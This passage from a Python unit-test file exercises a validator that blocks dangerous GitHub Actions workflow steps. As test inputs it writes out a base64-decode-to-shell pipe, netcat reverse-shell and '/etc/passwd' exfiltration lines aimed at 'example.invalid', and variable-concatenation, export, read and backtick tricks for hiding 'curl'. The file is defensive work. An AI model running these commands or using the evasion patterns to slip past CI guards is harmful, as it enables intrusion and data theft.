        text = GOOD_WORKFLOW + "      - run: echo $PAYLOAD | base64 -d | sh\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("base64" in v for v in violations))

    def test_sh_dash_c_rejected(self):
        text = GOOD_WORKFLOW + "      - run: sh -c 'echo hi'\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("sh -c" in v for v in violations))

    def test_bash_dash_c_rejected(self):
        text = GOOD_WORKFLOW + "      - run: bash -c 'echo hi'\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("bash -c" in v for v in violations))

    def test_mutating_gh_api_post_rejected(self):
        text = GOOD_WORKFLOW + "      - run: gh api -X POST /repos/x/y/releases\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("gh api" in v for v in violations))

    def test_mutating_gh_api_method_flag_variant_rejected(self):
        text = GOOD_WORKFLOW + "      - run: gh api --method POST /repos/x/y/releases\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("gh api" in v for v in violations))

    def test_read_only_gh_api_get_is_not_rejected_by_the_mutating_rule(self):
        """A plain read-only 'gh api' call (no explicit mutating method)
        must not be flagged by the *mutating-gh-api* rule specifically --
        this module does not blanket-forbid all 'gh api' usage."""
        text = "gh api /rate_limit"
        for pattern, label in wg._COMPILED_FORBIDDEN_PATTERNS:
            if "mutating" in label:
                self.assertIsNone(pattern.search(text))


class NetworkAndUploadActionTests(unittest.TestCase):
    def test_disguised_case_variant_upload_artifact_action_rejected(self):
        text = GOOD_WORKFLOW + "      - uses: Actions/Upload-Artifact@v4\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("upload" in v.lower() for v in violations))

    def test_unlisted_upload_action_rejected_by_generalized_heuristic(self):
        """An upload action this module has never explicitly enumerated
        (a fork, or a differently-named third-party action) must still
        be caught by the generalized 'uses:' name heuristic."""
        text = GOOD_WORKFLOW + "      - uses: some-fork/totally-unheard-of-upload-thing@v1\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("upload" in v.lower() for v in violations))

    def test_publish_action_rejected(self):
        text = GOOD_WORKFLOW + "      - uses: pypa/gh-action-pypi-publish@v1\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("publish" in v.lower() for v in violations))

    def test_deploy_action_rejected(self):
        text = GOOD_WORKFLOW + "      - uses: peaceiris/actions-gh-deploy@v3\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("deploy" in v.lower() for v in violations))

    def test_release_action_rejected(self):
        text = GOOD_WORKFLOW + "      - uses: ncipollo/release-action@v1\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("release" in v.lower() for v in violations))


class RefMutationTests(unittest.TestCase):
    def test_git_push_without_tags_flag_rejected(self):
        text = GOOD_WORKFLOW + "      - run: git push origin HEAD:refs/heads/gh-pages\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("git push" in v for v in violations))

    def test_git_push_tags_rejected(self):
        text = GOOD_WORKFLOW + "      - run: git push --tags\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("git push" in v for v in violations))

    def test_git_tag_rejected_case_insensitive(self):
        text = GOOD_WORKFLOW + "      - run: Git Tag v1.0.0\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("git tag" in v.lower() for v in violations))


class ValidDynamicSummaryWorkflowTests(unittest.TestCase):
    """A realistic, valid workflow using stdlib-JSON-driven dynamic
    summary generation (issue #9 item 7) must remain completely clean --
    hardening the guard must never produce a false positive against the
    actual, legitimate shape this repository's own workflow uses."""

    DYNAMIC_SUMMARY_WORKFLOW = """\
name: Release Rehearsal
on:
  pull_request:
    branches: [ "master" ]
  workflow_dispatch: {}

permissions:
  contents: read

jobs:
  release-rehearsal:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
        with:
          persist-credentials: false
      - name: Run release eligibility check
        run: make release-check
      - name: Render dynamic job summary from canonical JSON
        if: always()
        run: python3 -m scripts.release_rehearsal.cli check >> "$GITHUB_STEP_SUMMARY"
"""

    def test_valid_dynamic_summary_workflow_has_no_violations(self):
        violations = wg.validate_workflow_text(self.DYNAMIC_SUMMARY_WORKFLOW)
        self.assertEqual(violations, [])


# --- issue #9 residual-hardening: fresh-verifier-reproduced gaps -----------
# Every probe below encodes one of the four concrete residual gaps a
# fresh, independent verifier reproduced (bare `nc`, character-level
# shell-variable command assembly, npm/yarn/pnpm publish, docker
# push/login), plus negative controls proving the real workflow and
# ordinary, safe shell idioms remain completely clean.

class BareNetcatTests(unittest.TestCase):
    """A fresh, independent verifier reproduced a bare `nc host port`
    invocation (no leading `-` flag at all) surviving the previous
    dash-flag-only pattern (which required a `-` immediately after `nc`)."""

    def test_bare_nc_invocation_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: nc example.invalid 4444\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("'nc'" in v for v in violations), violations)

    def test_bare_nc_with_redirection_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: nc example.invalid 4444 < /etc/passwd\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("'nc'" in v for v in violations), violations)

    def test_flagged_nc_invocation_still_rejected(self):
        """Pre-existing coverage, retained: a flagged invocation must
        remain rejected too -- never weakened by the bare-invocation
        fix."""
        text = GOOD_WORKFLOW + "\n      - run: nc -e /bin/sh example.invalid 4444\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("'nc'" in v for v in violations), violations)

    def test_nc_case_insensitive_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: NC example.invalid 4444\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("'nc'" in v.lower() for v in violations), violations)

    def test_nc_extra_spacing_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: nc    example.invalid   4444\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("'nc'" in v for v in violations), violations)

    def test_ncat_still_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: ncat example.invalid 4444\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("ncat" in v for v in violations), violations)

    def test_nc_substring_inside_other_identifiers_not_falsely_rejected(self):
        """`\\bnc\\b` must not fire merely because "nc" appears glued
        inside a larger, unrelated word -- the exact substring false
        positive issue #9 requires this to avoid."""
        text = GOOD_WORKFLOW + "\n      - run: echo sync async func runc concurrency finance\n"
        violations = wg.validate_workflow_text(text)
        self.assertFalse(any("'nc'" in v for v in violations), violations)


class PackageAndContainerRegistryPublishTests(unittest.TestCase):
    """Package-registry publish and container-registry push/login
    commands, reproduced by a fresh, independent verifier as
    unrejected."""

    def test_npm_publish_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: npm publish\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("npm publish" in v.lower() for v in violations), violations)

    def test_npm_publish_case_insensitive_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: Npm Publish\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("npm publish" in v.lower() for v in violations), violations)

    def test_yarn_publish_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: yarn publish --non-interactive\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("yarn publish" in v.lower() for v in violations), violations)

    def test_pnpm_publish_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: pnpm publish --no-git-checks\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("pnpm publish" in v.lower() for v in violations), violations)

    def test_docker_push_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: docker push example.invalid/image:latest\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("docker push" in v.lower() for v in violations), violations)

    def test_docker_image_push_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: docker image push example.invalid/image:latest\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("docker push" in v.lower() for v in violations), violations)

    def test_docker_login_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: docker login -u user -p pass example.invalid\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("docker login" in v.lower() for v in violations), violations)

    def test_docker_login_case_insensitive_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: Docker Login example.invalid\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("docker login" in v.lower() for v in violations), violations)

    def test_non_publishing_commands_not_rejected_by_the_publish_login_rules(self):
        """A plain, non-publishing npm/yarn/pnpm/docker command must not
        be flagged by these publish/login-specific rules."""
        text = "npm install\nyarn add left-pad\npnpm install\ndocker build -t x .\ndocker pull x\n"
        for pattern, label in wg._COMPILED_FORBIDDEN_PATTERNS:
            if "publish" in label or "docker login" in label:
                self.assertIsNone(pattern.search(text), (label, pattern.pattern))


class VariableCommandAssemblyTests(unittest.TestCase):
    """A fresh, independent verifier reproduced a dangerous command name
    assembled at runtime from concatenated shell variable expansions in
    command position (`X=cur; Y=l; $X$Y ...`), evading every literal-
    substring `FORBIDDEN_PATTERNS` check above since the literal command
    name never appears anywhere in the workflow text."""

    def test_literal_issue_example_bare_concatenation_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: X=cur; Y=l; $X$Y https://example.invalid\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)

    def test_braced_concatenation_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          X=cur\n"
            + "          Y=l\n"
            + "          ${X}${Y} https://example.invalid\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)

    def test_mixed_brace_and_bare_concatenation_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          X=cur\n"
            + "          Y=l\n"
            + "          $X${Y} https://example.invalid\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)

    def test_three_fragment_concatenation_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          X=c\n"
            + "          Y=u\n"
            + "          Z=rl\n"
            + "          $X$Y$Z https://example.invalid\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)

    def test_uppercase_and_extra_spacing_variant_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: X=CUR;    Y=L;   $X$Y https://example.invalid\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)

    def test_concatenation_split_across_a_line_continuation_rejected(self):
        """The concatenation must still be detected once a shell
        line-continuation splitting it across two YAML lines has
        already been collapsed by `_normalize_for_scanning`."""
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          X=cur; Y=l; $X\\\n"
            + "          $Y https://example.invalid\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)

    def test_crlf_concatenation_rejected(self):
        text = (
            GOOD_WORKFLOW.replace("\n", "\r\n")
            + "      - run: |\r\n"
            + "          X=cur; Y=l; $X$Y https://example.invalid\r\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)

    def test_direct_variable_command_invocation_rejected(self):
        """A single variable, assigned a full literal command name and
        then invoked directly (no fragment assembly needed), is the
        'analogous direct variable command invocation' issue #9 also
        requires rejected."""
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          CMD=curl\n"
            + "          $CMD https://example.invalid\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("locally assigned a literal value" in v for v in violations), violations)

    def test_direct_variable_command_invocation_braced_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          CMD=curl\n"
            + "          ${CMD} https://example.invalid\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("locally assigned a literal value" in v for v in violations), violations)

    def test_direct_variable_command_invocation_on_one_line_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: CMD=curl; $CMD https://example.invalid\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("locally assigned a literal value" in v for v in violations), violations)

    # --- negative controls: must never break the real, legitimate shape ---

    def test_safe_dynamic_summary_redirection_not_flagged(self):
        text = (
            GOOD_WORKFLOW
            + '      - run: python3 -m scripts.release_rehearsal.cli summary >> "$GITHUB_STEP_SUMMARY"\n'
        )
        violations = wg.validate_workflow_text(text)
        self.assertEqual(violations, [])

    def test_ordinary_non_command_variable_interpolation_not_flagged(self):
        """Two variables concatenated purely as *displayed data* --
        never in command position -- must not be flagged: this is the
        'ordinary non-command data interpolation' issue #9 requires to
        keep working."""
        text = GOOD_WORKFLOW + '\n      - run: echo "combined=$A$B"\n'
        violations = wg.validate_workflow_text(text)
        self.assertEqual(violations, [])

    def test_env_prefixed_real_command_not_misclassified_as_assignment(self):
        """The common, legitimate `FOO=bar some-command args` inline-
        env-var-prefix idiom must not itself be (mis)treated as a 'pure'
        local assignment that would then make an unrelated later
        command invocation of some other, differently-named variable
        suspicious."""
        text = GOOD_WORKFLOW + "\n      - run: FOO=bar make release-check\n"
        violations = wg.validate_workflow_text(text)
        self.assertEqual(violations, [])

    def test_single_never_locally_assigned_variable_command_not_flagged(self):
        """A single `$VAR` used directly as a command, when `VAR` was
        never locally assigned anywhere in this same script (e.g. an
        inherited/ambient environment variable), is not, by itself,
        high-confidence evidence of evasion -- only a *locally assigned*
        variable later invoked as a command is."""
        text = GOOD_WORKFLOW + "\n      - run: $SHELL --version\n"
        violations = wg.validate_workflow_text(text)
        self.assertEqual(violations, [])

    def test_real_workflow_remains_clean(self):
        path = ROOT / ".github" / "workflows" / "release-rehearsal.yml"
        violations = wg.check_variable_command_assembly(path.read_text(encoding="utf-8"))
        self.assertEqual(violations, [])

    def test_real_workflow_full_validation_remains_clean(self):
        path = ROOT / ".github" / "workflows" / "release-rehearsal.yml"
        violations = wg.validate_workflow_text(path.read_text(encoding="utf-8"))
        self.assertEqual(violations, [])


class CommandSubstitutionAndTrackedAssignmentTests(unittest.TestCase):
    """Issue #9 residual hardening: a fresh, independent verifier
    reproduced three further high-confidence shell-indirection shapes
    still unrejected after the previous round: (1) a variable/fragment-
    assembled command executed *inside* a `$( ... )` command
    substitution, (2) a variable assigned via `export NAME=value` and
    later invoked directly as a command, and (3) a variable populated
    via `read NAME`/`read -r NAME` and later invoked directly as a
    command. Each is exercised inline, in a block (`run: |`) scalar,
    with braced/bare and mixed forms, case variants, extra spacing, and
    (for command substitution) a line continuation splitting the
    assembled fragments -- plus safe negative controls that must never
    be flagged."""

    # --- (1) command substitution executing an assembled/tracked command ---

    def test_command_substitution_bare_concatenation_rejected(self):
        text = GOOD_WORKFLOW + (
            "\n      - run: X=cur; Y=l; echo $($X$Y https://example.invalid)\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)

    def test_command_substitution_braced_concatenation_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          X=cur\n"
            + "          Y=l\n"
            + "          echo $(${X}${Y} https://example.invalid)\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)

    def test_command_substitution_mixed_brace_concatenation_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          X=cur\n"
            + "          Y=l\n"
            + "          echo $($X${Y} https://example.invalid)\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)

    def test_command_substitution_extra_spacing_after_open_paren_rejected(self):
        text = GOOD_WORKFLOW + (
            "\n      - run: X=cur; Y=l; echo $(   $X$Y https://example.invalid)\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)

    def test_command_substitution_uppercase_value_variant_rejected(self):
        text = GOOD_WORKFLOW + (
            "\n      - run: X=CUR; Y=L; echo $($X$Y https://example.invalid)\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)

    def test_command_substitution_concatenation_split_across_continuation_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          X=cur; Y=l; echo $($X\\\n"
            + "          $Y https://example.invalid)\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)

    def test_command_substitution_direct_single_var_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          CMD=curl\n"
            + "          echo $($CMD https://example.invalid)\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("locally assigned a literal value" in v for v in violations), violations)

    def test_command_substitution_direct_single_var_braced_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          CMD=curl\n"
            + "          echo $(${CMD} https://example.invalid)\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("locally assigned a literal value" in v for v in violations), violations)

    def test_command_substitution_direct_single_var_no_trailing_args_rejected(self):
        """`$($CMD)` -- the variable is the entire subshell body, with no
        space before the closing paren -- must still be caught."""
        text = GOOD_WORKFLOW + "\n      - run: CMD=curl; echo $($CMD)\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("locally assigned a literal value" in v for v in violations), violations)

    def test_command_substitution_inline_one_line_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: CMD=curl; echo $($CMD https://example.invalid)\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("locally assigned a literal value" in v for v in violations), violations)

    # --- (2) export NAME=value then a later direct invocation ---

    def test_export_then_direct_invocation_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          export CMD=curl\n"
            + "          $CMD https://example.invalid\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("locally assigned a literal value" in v for v in violations), violations)

    def test_export_then_direct_invocation_braced_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          export CMD=curl\n"
            + "          ${CMD} https://example.invalid\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("locally assigned a literal value" in v for v in violations), violations)

    def test_export_then_direct_invocation_inline_one_line_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: export CMD=curl; $CMD https://example.invalid\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("locally assigned a literal value" in v for v in violations), violations)

    def test_export_extra_spacing_variant_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          export   CMD=curl\n"
            + "          $CMD https://example.invalid\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("locally assigned a literal value" in v for v in violations), violations)

    def test_export_then_command_substitution_invocation_rejected(self):
        """Both residual gaps combined: `export` assignment, then
        invoked directly inside a `$( ... )` command substitution."""
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          export CMD=curl\n"
            + "          echo $($CMD https://example.invalid)\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("locally assigned a literal value" in v for v in violations), violations)

    # --- (3) read/read -r NAME then a later direct invocation ---

    def test_read_then_direct_invocation_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          read CMD\n"
            + "          $CMD https://example.invalid\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("populated by a 'read' statement" in v for v in violations), violations)

    def test_read_dash_r_then_direct_invocation_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          read -r CMD\n"
            + "          $CMD https://example.invalid\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("populated by a 'read' statement" in v for v in violations), violations)

    def test_read_then_direct_invocation_braced_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          read CMD\n"
            + "          ${CMD} https://example.invalid\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("populated by a 'read' statement" in v for v in violations), violations)

    def test_read_then_direct_invocation_inline_one_line_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: read CMD; $CMD https://example.invalid\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("populated by a 'read' statement" in v for v in violations), violations)

    def test_read_mixed_case_variable_name_variant_rejected(self):
        """A mixed-case tracked variable name (`read`'s own keyword is
        always lowercase in a real POSIX shell -- only the *variable
        name* itself may vary in case) is still tracked and rejected."""
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          read CmdName\n"
            + "          $CmdName https://example.invalid\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("populated by a 'read' statement" in v for v in violations), violations)

    def test_read_then_command_substitution_invocation_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          read -r CMD\n"
            + "          echo $($CMD https://example.invalid)\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("populated by a 'read' statement" in v for v in violations), violations)

    # --- negative controls: safe shapes must never be flagged ---

    def test_ordinary_literal_command_substitution_not_flagged(self):
        """A plain, non-assembled `$(...)` command substitution
        (e.g. `$(date)`) is never itself flagged -- only an assembled
        or tracked-variable command executed inside it is."""
        text = GOOD_WORKFLOW + '\n      - run: echo "today is $(date)"\n'
        violations = wg.validate_workflow_text(text)
        self.assertEqual(violations, [])

    def test_export_used_only_as_data_not_flagged(self):
        """`export`ing a variable and only ever reading it back as
        *data* (never invoking it as a command) must not be flagged."""
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          export FOO=bar\n"
            + '          echo "$FOO"\n'
        )
        violations = wg.validate_workflow_text(text)
        self.assertEqual(violations, [])

    def test_read_used_only_as_data_not_flagged(self):
        """`read`ing a variable and only ever using it as *data* (never
        invoking it as a command) must not be flagged."""
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          read FOO\n"
            + '          echo "$FOO"\n'
        )
        violations = wg.validate_workflow_text(text)
        self.assertEqual(violations, [])

    def test_env_prefixed_command_with_export_elsewhere_not_misclassified(self):
        """The legitimate `FOO=bar some-command args` inline-env-var-
        prefix idiom is still not mistaken for a tracked assignment,
        even in a script that also happens to `export` an unrelated
        variable."""
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          export UNRELATED=value\n"
            + "          FOO=bar make release-check\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertEqual(violations, [])

    def test_safe_dynamic_summary_redirection_still_not_flagged(self):
        text = (
            GOOD_WORKFLOW
            + '      - run: python3 -m scripts.release_rehearsal.cli summary >> "$GITHUB_STEP_SUMMARY"\n'
        )
        violations = wg.validate_workflow_text(text)
        self.assertEqual(violations, [])

    def test_read_data_use_and_literal_command_substitution_combined_not_flagged(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          read FOO\n"
            + '          echo "value=$(date) $FOO"\n'
        )
        violations = wg.validate_workflow_text(text)
        self.assertEqual(violations, [])

    def test_real_workflow_remains_clean(self):
        path = ROOT / ".github" / "workflows" / "release-rehearsal.yml"
        violations = wg.check_variable_command_assembly(path.read_text(encoding="utf-8"))
        self.assertEqual(violations, [])

    def test_real_workflow_full_validation_remains_clean(self):
        path = ROOT / ".github" / "workflows" / "release-rehearsal.yml"
        violations = wg.validate_workflow_text(path.read_text(encoding="utf-8"))
        self.assertEqual(violations, [])


class BacktickCommandSubstitutionTests(unittest.TestCase):
    """Final focused-review closure: a fresh, independent verifier
    confirmed legacy backtick (`` ` ... ` ``) command substitution was
    entirely unrecognized as a command position, so every
    variable/fragment-assembly and tracked-variable evasion already
    closed for `$( ... )` could still hide inside a backtick pair
    instead and go completely unrejected. Each probe below mirrors an
    already-covered `$( ... )` shape, spelled with backticks instead,
    plus negative controls proving ordinary/prose backtick usage --
    including this real workflow's own markdown-style comment
    backticks -- is never mistakenly flagged."""

    def test_backtick_bare_concatenation_rejected(self):
        text = GOOD_WORKFLOW + (
            "\n      - run: X=cur; Y=l; echo `$X$Y https://example.invalid`\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)

    def test_backtick_braced_concatenation_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          X=cur\n"
            + "          Y=l\n"
            + "          echo `${X}${Y} https://example.invalid`\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)

    def test_backtick_direct_single_var_assigned_rejected(self):
        """Deliberately not curl-shaped here (`CMD=nc`, not a literal
        network-command substring): the single-tracked-variable rule
        alone -- independent of any literal-command-name check -- must
        still fire."""
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          CMD=nc\n"
            + "          echo `$CMD example.invalid 4444`\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("locally assigned a literal value" in v for v in violations), violations)

    def test_backtick_direct_single_var_no_trailing_args_rejected(self):
        """A backtick-wrapped `$CMD` with no trailing argument and no
        space before the closing backtick must still be caught."""
        text = GOOD_WORKFLOW + "\n      - run: CMD=curl; echo `$CMD`\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("locally assigned a literal value" in v for v in violations), violations)

    def test_backtick_export_then_direct_invocation_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          export CMD=curl\n"
            + "          echo `$CMD https://example.invalid`\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("locally assigned a literal value" in v for v in violations), violations)

    def test_backtick_read_then_direct_invocation_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          read CMD\n"
            + "          echo `$CMD https://example.invalid`\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("populated by a 'read' statement" in v for v in violations), violations)

    def test_backtick_inline_one_line_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: CMD=curl; echo `$CMD https://example.invalid`\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("locally assigned a literal value" in v for v in violations), violations)

    # --- negative controls ---

    def test_ordinary_literal_backtick_command_substitution_not_flagged(self):
        """A plain, non-assembled backtick command substitution (e.g.
        `` `date` ``) is never itself flagged -- only an assembled or
        tracked-variable command executed inside it is."""
        text = GOOD_WORKFLOW + '\n      - run: echo "today is `date`"\n'
        violations = wg.validate_workflow_text(text)
        self.assertEqual(violations, [])

    def test_markdown_style_comment_backticks_not_flagged(self):
        """Backticks used purely as prose/markdown code-span punctuation
        in a YAML comment (this real workflow's own top-of-file comments
        use exactly this idiom) must never be mistaken for command
        substitution: they never sit at a recognized command position."""
        text = (
            "# See `docs/release_process.md` and run `make release-check`\n"
            "# before touching `scripts/release_rehearsal/workflow_guard.py`.\n"
        ) + GOOD_WORKFLOW
        violations = wg.validate_workflow_text(text)
        self.assertEqual(violations, [])

    def test_escaped_literal_backtick_not_flagged(self):
        """A shell-escaped, literal backtick character (a backslash
        immediately before a backtick, meant to print a literal backtick
        rather than open a substitution) is not itself dangerous and
        must not be flagged by this narrow, command-position-aware
        heuristic."""
        text = GOOD_WORKFLOW + '\n      - run: echo "a literal \\` backtick"\n'
        violations = wg.validate_workflow_text(text)
        self.assertEqual(violations, [])

    def test_real_workflow_remains_clean(self):
        path = ROOT / ".github" / "workflows" / "release-rehearsal.yml"
        violations = wg.validate_workflow_text(path.read_text(encoding="utf-8"))
        self.assertEqual(violations, [])


class MultiVariableReadTrackingTests(unittest.TestCase):
    """Final focused-review closure: a fresh, independent verifier
    confirmed `read A B` (and any further multi-variable `read`) tracked
    only the first named variable, so a later direct invocation of any
    subsequent name went completely unrejected."""

    def test_read_two_variables_second_invoked_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          read A B\n"
            + "          $B https://example.invalid\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("populated by a 'read' statement" in v for v in violations), violations)

    def test_read_two_variables_first_invoked_still_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          read A B\n"
            + "          $A https://example.invalid\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("populated by a 'read' statement" in v for v in violations), violations)

    def test_read_three_variables_third_invoked_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          read A B C\n"
            + "          $C https://example.invalid\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("populated by a 'read' statement" in v for v in violations), violations)

    def test_read_dash_r_multiple_variables_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          read -r A B\n"
            + "          $B https://example.invalid\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("populated by a 'read' statement" in v for v in violations), violations)

    def test_read_multiple_variables_invoked_inside_command_substitution_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          read A B\n"
            + "          echo $($B https://example.invalid)\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("populated by a 'read' statement" in v for v in violations), violations)

    def test_read_two_variables_inline_one_line_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: read A B; $B https://example.invalid\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("populated by a 'read' statement" in v for v in violations), violations)

    # --- negative controls ---

    def test_read_multiple_variables_used_only_as_data_not_flagged(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
